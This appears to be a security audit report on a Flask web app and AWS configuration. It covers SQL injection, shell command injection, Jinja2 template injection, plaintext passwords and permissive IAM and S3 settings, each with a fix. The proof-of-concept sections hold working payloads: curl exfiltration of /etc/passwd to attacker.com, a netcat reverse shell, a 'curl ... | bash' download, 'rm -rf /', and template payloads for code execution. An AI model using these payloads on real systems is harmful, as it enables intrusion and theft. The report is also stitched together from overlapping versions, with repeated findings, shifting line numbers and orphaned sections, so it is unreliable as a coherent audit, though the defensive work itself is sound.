## CRITICAL Vulnerabilities

### VULN-001: SQL Injection via String Concatenation
- **File:** `./app/routes/auth.py`, lines 40–43
- **OWASP:** A03 – Injection | **CWE:** CWE-89 (SQL Injection)
- **Severity:** 🔴 CRITICAL

**Vulnerable Code:**
```python
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
result = db.session.execute(query)
```

**Technical Explanation:**
User-controlled input (`username`, `password`) is concatenated directly into a raw SQL string. An attacker can supply a payload such as `' OR '1'='1' --` as the username to bypass authentication entirely, or use `'; DROP TABLE users; --` to destroy data. This is a textbook SQL injection vulnerability with no sanitisation or parameterisation whatsoever.

**Proof-of-Concept Attack:**
```
username: admin' --
password: anything
→ Executes: SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
→ Logs in as admin with no valid password
```

**Remediation:**
```python
# Use SQLAlchemy ORM (already available in the project)
from app.models import User

@auth_bp.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    username = data.get("username")
    password = data.get("password")

    # Parameterised query via ORM
    user = User.query.filter_by(username=username).first()
    if user and check_password_hash(user.password, password):
        token = generate_token(user.id)
        return jsonify({"message": "Login successful", "token": token}), 200
    return jsonify({"error": "Invalid credentials"}), 401
```

### VULN-002: OS Command Injection via `subprocess.run` with `shell=True`
- **File:** `./app/routes/files.py`, lines 24–30
- **OWASP:** A03 – Injection | **CWE:** CWE-78 (OS Command Injection)
- **Severity:** 🔴 CRITICAL

**Vulnerable Code:**
```python
result = subprocess.run(
    "file " + filename,
    shell=True,
    capture_output=True,
    text=True
)
```

**Technical Explanation:**
The `filename` parameter is taken directly from user-supplied JSON and concatenated into a shell command string. With `shell=True`, the OS shell interprets the entire string, allowing an attacker to inject arbitrary shell commands using metacharacters (`;`, `&&`, `|`, `` ` ``, `$(...)`).

**Proof-of-Concept Attack:**
```
filename: "test.txt; rm -rf / --no-preserve-root"
filename: "test.txt && curl http://attacker.com/exfil?data=$(cat /etc/passwd)"
filename: "test.txt | nc attacker.com 4444 -e /bin/bash"
```

**Remediation:**
```python
import shlex

@files_bp.route("/process", methods=["POST"])
def process_file():
    data = request.get_json()
    filename = data.get("filename")

    # Validate filename against allowlist
    if not re.match(r'^[\w\-. ]+$', filename):
        return jsonify({"error": "Invalid filename"}), 400

    # Pass as list (no shell interpolation), shell=False (default)
    result = subprocess.run(
        ["file", filename],          # List form prevents shell injection
        shell=False,                 # Never use shell=True with user input
        capture_output=True,
        text=True,
        timeout=10                   # Prevent hanging processes
    )
    return jsonify({"filename": filename, "output": result.stdout}), 200
```

### VULN-003: Server-Side Template Injection (SSTI)
- **File:** `./app/routes/templates.py`, lines 13–19
- **OWASP:** A03 – Injection | **CWE:** CWE-94 (Code Injection)
- **Severity:** 🔴 CRITICAL

**Vulnerable Code:**
```python
env = Environment()
template = env.from_string(template_str)
rendered = template.render(**context)
```

**Technical Explanation:**
A raw Jinja2 `Environment()` is created with no sandboxing, and user-supplied template strings are rendered directly. Jinja2 templates have access to Python's object model, allowing an attacker to traverse the MRO (Method Resolution Order) to reach dangerous built-ins and execute arbitrary code on the server.

**Proof-of-Concept Attack:**
```
POST /templates/render
{
  "template": "{{ ''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate()[0].strip() }}",
  "context": {}
}
→ Returns output of `id` command (or any arbitrary OS command)
```

**Remediation:**
```python
from jinja2.sandbox import SandboxedEnvironment

@templates_bp.route("/render", methods=["POST"])
def render_template_custom():
    data = request.get_json()
    template_str = data.get("template")
    context = data.get("context", {})

    # Validate context keys to prevent prototype pollution
    allowed_keys = re.compile(r'^[a-zA-Z_][a-zA-Z0-9_]*$')
    if not all(allowed_keys.match(k) for k in context.keys()):
        return jsonify({"error": "Invalid context keys"}), 400

    # Use SandboxedEnvironment to restrict template capabilities
    env = SandboxedEnvironment()
    try:
        template = env.from_string(template_str)
        rendered = template.render(**context)
    except Exception as e:
        return jsonify({"error": "Template rendering failed"}), 400

    return jsonify({"rendered": rendered}), 200
```

> **Note:** Even `SandboxedEnvironment` has had historical bypasses. Consider whether user-defined template rendering is a necessary feature at all. If not, remove the endpoint entirely.

### VULN-004: Passwords Stored in Plaintext
- **File:** `./app/routes/auth.py`, lines 30–35 | `./app/models.py`, line 9
- **OWASP:** A02 – Cryptographic Failures | **CWE:** CWE-256 (Plaintext Storage of Password)
- **Severity:** 🔴 CRITICAL

**Vulnerable Code:**
```python
# auth.py - password stored as-is
user = User(username=username, password=password, email=email)

# models.py - no hashing indicated
password = db.Column(db.String(120), nullable=False)
```

**Technical Explanation:**
Passwords are stored in the database without any hashing or salting. If the database is compromised (via SQL injection, backup exposure, etc.), all user passwords are immediately exposed in plaintext. The `String(120)` column length is also too short for bcrypt hashes (which are 60 characters) but indicates no hashing is applied.

**Remediation:**
```python
# Install: pip install Flask-Bcrypt
from flask_bcrypt import Bcrypt
bcrypt = Bcrypt()

# In register():
hashed_password = bcrypt.generate_password_hash(password).decode('utf-8')
user = User(username=username, password=hashed_password, email=email)

# In login():
user = User.query.filter_by(username=username).first()
if user and bcrypt.check_password_hash(user.password, password):
    token = generate_token(user.id)
    ...

# In models.py - increase column size for hash storage:
password = db.Column(db.String(255), nullable=False)
```

### VULN-007: Overly Permissive SecretsManager Policy
- **File:** `./infrastructure/iam-policy.json`, lines 28–36
- **OWASP:** A01 – Broken Access Control | **CWE:** CWE-732
- **Severity:** 🟠 HIGH

**Vulnerable Code:**
```json
{
    "Sid": "SecretsManagerAccess",
    "Effect": "Allow",
    "Action": [
        "secretsmanager:GetSecretValue",
        "secretsmanager:ListSecrets",
        "secretsmanager:DeleteSecret"
    ],
    "Resource": "*"
}
```

**Technical Explanation:**
`DeleteSecret` on `Resource: "*"` allows deletion of any secret in the account — a destructive capability that should never be granted broadly. `ListSecrets` on `*` exposes the names and metadata of all secrets. These permissions should be scoped to specific secret ARNs and `DeleteSecret` should be removed unless explicitly required.

**Remediation:** See VULN-006 remediation above — scope to specific ARNs and remove `DeleteSecret` and `ListSecrets`.

- **File:** `./infrastructure/main.tf`, lines 19–27
- **OWASP:** A05 – Security Misconfiguration | **CWE:** CWE-732
- **Severity:** 🟠 HIGH

**Vulnerable Code:**
```hcl
resource "aws_s3_bucket_public_access_block" "public_bucket_access" {
  block_public_acls       = false
  block_public_policy     = false
  ignore_public_acls      = false
  restrict_public_buckets = false
}
```

**Technical Explanation:**
All four S3 public access block settings are explicitly disabled, meaning the bucket can be made publicly accessible via ACLs or bucket policies. Any sensitive data uploaded to this bucket could be exposed to the internet.

**Remediation:**
```hcl
resource "aws_s3_bucket_public_access_block" "public_bucket_access" {
  bucket = aws_s3_bucket.public_bucket.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}
```

If public access is genuinely required (e.g., for static assets), use CloudFront as a distribution layer rather than making the S3 bucket directly public.

## VULNERABILITY 1: SQL Injection

**File:** `./app/routes/auth.py`, lines 37–39  
**CWE:** CWE-89 — Improper Neutralization of Special Elements used in SQL Command  
**OWASP:** A03:2021 — Injection  
**Severity:** 🔴 CRITICAL

### Vulnerable Code
```python
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
result = db.session.execute(query)
```

### Technical Explanation
User-supplied input (`username` and `password`) is concatenated directly into a raw SQL string with no sanitisation or parameterisation. An attacker can supply a username such as `' OR '1'='1' --` to bypass authentication entirely, or use `'; DROP TABLE users; --` to destroy data. Because the raw string is passed to `db.session.execute()`, the database engine interprets the injected SQL as legitimate commands.

### Remediation
```python
from sqlalchemy import text

@auth_bp.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    username = data.get("username")
    password = data.get("password")

    # Use parameterised query — never string-concatenate user input
    query = text("SELECT * FROM users WHERE username = :username AND password = :password")
    result = db.session.execute(query, {"username": username, "password": password})
    user = result.fetchone()

    if user:
        token = generate_token(user[0])
        return jsonify({"message": "Login successful", "token": token}), 200
    return jsonify({"error": "Invalid credentials"}), 401
```

> **Additional note:** Passwords must be hashed (see Vulnerability 5). Comparing plaintext passwords in SQL is itself a critical flaw.

## VULNERABILITY 3: Server-Side Template Injection (SSTI)

**File:** `./app/routes/templates.py`, lines 13–20  
**CWE:** CWE-94 — Improper Control of Generation of Code ('Code Injection')  
**OWASP:** A03:2021 — Injection  
**Severity:** 🔴 CRITICAL

### Vulnerable Code
```python
env = Environment()                        # no sandboxing
template = env.from_string(template_str)  # raw user input as template
rendered = template.render(**context)
```

### Technical Explanation
A Jinja2 `Environment()` created without a sandbox gives the template full access to Python's object model. An attacker can send:
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```
to enumerate classes, and then:
```
{{ ''.__class__.__mro__[1].__subclasses__()[<n>].__init__.__globals__['os'].popen('id').read() }}
```
to achieve **remote code execution**. This is a well-documented Jinja2 SSTI attack chain.

### Remediation
```python
from jinja2.sandbox import SandboxedEnvironment

@templates_bp.route("/render", methods=["POST"])
def render_template_custom():
    data = request.get_json()
    template_str = data.get("template", "")
    context = data.get("context", {})

    # Whitelist allowed context keys to prevent namespace pollution
    allowed_keys = {"name", "title", "body"}  # define per your use case
    safe_context = {k: v for k, v in context.items() if k in allowed_keys}

    # SandboxedEnvironment restricts access to dangerous attributes
    env = SandboxedEnvironment()
    try:
        template = env.from_string(template_str)
        rendered = template.render(**safe_context)
    except Exception:
        return jsonify({"error": "Template rendering failed"}), 400

    return jsonify({"rendered": rendered}), 200
```

> **Architectural recommendation:** Avoid rendering user-supplied templates entirely. Use a predefined template library with variable substitution only.

## VULNERABILITY 1: SQL Injection

**File:** `./app/routes/auth.py`, lines 36–38
**CWE:** CWE-89 — Improper Neutralization of Special Elements used in SQL Command
**OWASP:** A03:2021 — Injection
**Severity:** 🔴 CRITICAL

### Technical Explanation
The login route constructs a raw SQL query via string concatenation using unsanitised user input:

```python
# VULNERABLE CODE
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
```


An attacker can bypass authentication entirely by supplying:
- `username`: `admin' --`
- `password`: `anything`

This transforms the query into:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

The password check is commented out, granting access to any account.

### Remediation
Use SQLAlchemy's ORM or parameterised queries:

```python
# SECURE: Use ORM (preferred)
user = User.query.filter_by(username=username, password=hashed_password).first()

# SECURE: Parameterised query if raw SQL is required
from sqlalchemy import text
query = text("SELECT * FROM users WHERE username = :username AND password = :password")
result = db.session.execute(query, {"username": username, "password": hashed_password})
```

## VULNERABILITY 2: OS Command Injection

**File:** `./app/routes/files.py`, lines 22–29
**CWE:** CWE-78 — Improper Neutralization of Special Elements used in an OS Command
**OWASP:** A03:2021 — Injection
**Severity:** 🔴 CRITICAL

### Technical Explanation
User-supplied `filename` is concatenated directly into a shell command executed with `shell=True`:

```python
# VULNERABLE CODE
result = subprocess.run(
    "file " + filename,   # unsanitised user input
    shell=True,           # shell interpretation enabled
    capture_output=True,
    text=True
)
```

An attacker supplying `filename = "foo; rm -rf / #"` or `"foo && curl attacker.com/shell.sh | bash"` achieves arbitrary remote code execution on the server.

### Remediation
Pass arguments as a list and disable shell interpretation:

```python
# SECURE
import shlex

ALLOWED_UPLOAD_DIR = "/var/app/uploads"

def is_safe_path(filename: str) -> bool:
    safe_path = os.path.realpath(os.path.join(ALLOWED_UPLOAD_DIR, filename))
    return safe_path.startswith(ALLOWED_UPLOAD_DIR)

@files_bp.route("/process", methods=["POST"])
def process_file():
    data = request.get_json()
    filename = data.get("filename")

    if not filename or not is_safe_path(filename):
        return jsonify({"error": "Invalid filename"}), 400

    full_path = os.path.join(ALLOWED_UPLOAD_DIR, filename)

    result = subprocess.run(
        ["file", full_path],   # list form — no shell expansion
        shell=False,           # explicit
        capture_output=True,
        text=True,
        timeout=10
    )
    return jsonify({"output": result.stdout}), 200
```

## VULNERABILITY 3: Server-Side Template Injection (SSTI)

**File:** `./app/routes/templates.py`, lines 13–20
**CWE:** CWE-94 — Improper Control of Generation of Code ('Code Injection')
**OWASP:** A03:2021 — Injection
**Severity:** 🔴 CRITICAL

### Technical Explanation
A raw Jinja2 `Environment` is instantiated without a sandbox, and user-supplied template strings are rendered directly:

```python
# VULNERABLE CODE
env = Environment()                        # no sandboxing
template = env.from_string(template_str)   # attacker controls template_str
rendered = template.render(**context)
```

An attacker can exfiltrate secrets or execute arbitrary code:
```
{{ config.SECRET_KEY }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__()[<n>]('/etc/passwd').read() }}
```

### Remediation
Use `SandboxedEnvironment` and restrict what is exposed, or avoid rendering user-supplied templates entirely:

```python
from jinja2.sandbox import SandboxedEnvironment

@templates_bp.route("/render", methods=["POST"])
def render_template_custom():
    data = request.get_json()
    template_str = data.get("template", "")
    context = data.get("context", {})

    # Whitelist allowed context keys
    allowed_keys = {"name", "title", "body"}
    safe_context = {k: v for k, v in context.items() if k in allowed_keys}

    env = SandboxedEnvironment()           # sandboxed — blocks dangerous attribute access
    try:
        template = env.from_string(template_str)
        rendered = template.render(**safe_context)
    except Exception:
        return jsonify({"error": "Invalid template"}), 400

    return jsonify({"rendered": rendered}), 200
```

> **Note:** Even `SandboxedEnvironment` has had historical bypasses. The safest approach is to avoid user-controlled templates entirely and use a whitelist of pre-approved templates stored server-side.

**Files:** `./app/routes/users.py`, `./app/routes/files.py`, `./app/routes/templates.py`


### Remediation

```python
# app/utils/auth.py
import jwt
from functools import wraps
from flask import request, jsonify, current_app

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get("Authorization", "")
        if not auth_header.startswith("Bearer "):
            return jsonify({"error": "Missing token"}), 401
        token = auth_header.split(" ", 1)[1]
        try:
            payload = jwt.decode(
                token,
                current_app.config["JWT_SECRET"],
                algorithms=["HS256"]
            )
            request.current_user_id = payload["user_id"]
        except jwt.ExpiredSignatureError:
            return jsonify({"error": "Token expired"}), 401
        except jwt.InvalidTokenError:
            return jsonify({"error": "Invalid token"}), 401
        return f(*args, **kwargs)
    return decorated

def require_role(role):
    def decorator(f):
        @wraps(f)
        @require_auth
        def decorated(*args, **kwargs):
            # fetch user and check role
            ...
        return decorated
    return decorator

# Usage
@users_bp.route("/delete/<username>", methods=["DELETE"])
@require_role("admin")
def delete_user(username): ...
```
